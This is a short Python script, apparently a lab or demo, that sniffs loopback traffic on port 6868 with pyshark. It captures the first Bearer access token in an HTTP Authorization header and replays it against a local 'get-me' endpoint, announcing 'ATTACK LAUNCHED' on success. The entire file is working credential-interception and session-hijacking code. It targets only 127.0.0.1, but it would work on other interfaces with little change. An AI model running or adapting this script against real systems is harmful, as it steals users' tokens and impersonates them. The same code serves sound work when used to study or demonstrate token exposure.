import pyshark
import requests

USER_ACC_MGMT_SERV_ADDR = "http://127.0.0.1:6868/"
GET_ME_ENDPOINT = "get-me"

def capture_packets():
    """
    Capture packets from the server on the loopback interface, print all captured traffic,
    and extract the Authorization token.
    """
    print("Starting packet capture on loopback (127.0.0.1), TCP port 6868...")
    
    # Set up a live capture on the loopback interface
    capture = pyshark.LiveCapture(
        interface='lo',  # Use 'lo0' for Mac if needed
        bpf_filter='tcp port 6868'  # Capture only TCP traffic on port 6868
    )
    
    for packet in capture.sniff_continuously():  # Capture packets indefinitely
        try:
            # Print the entire packet details
            print("\nCaptured Packet:")
            print(packet)

            # Check if the packet contains HTTP layer
            if 'HTTP' in packet:
                http_layer = packet.http
                print("\nHTTP Layer Detected:")
                print(http_layer)

                # Check if the HTTP packet contains an Authorization header
                if hasattr(http_layer, 'authorization'):
                    auth_header = http_layer.authorization
                    print(f"Authorization Header Captured: {auth_header}")

                    # Extract the token from the Bearer header
                    if auth_header.lower().startswith('bearer '):
                        token = auth_header.split(' ')[1]
                        print(f"Access Token Extracted: {token}")
                        return token  # Exit after capturing the first token

        except AttributeError:
            # Ignore packets without HTTP or malformed data
            continue

def make_request_with_token(token):
    """
    Use the extracted token to make a request to the server.
    """
    url = USER_ACC_MGMT_SERV_ADDR + GET_ME_ENDPOINT
    headers = {"Authorization": f"Bearer {token}"}

    print(f"\nMaking a request to {url} with token...")
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        print("Server Response: ", response.json())
        print("\nSystem intercepted ----------- ATTACK LAUNCHED")
    else:
        print(f"Failed to retrieve data. Status Code: {response.status_code}, Response: {response.text}")
        print("\nSystem interception failed ----------- ATTACK FAILED")

if __name__ == "__main__":
    # Step 1: Capture packets and extract the access token
    token = capture_packets()

    if token:
        # Step 2: Use the token to make a request to the server
        make_request_with_token(token)
    else:
        print("\nNo token captured.")
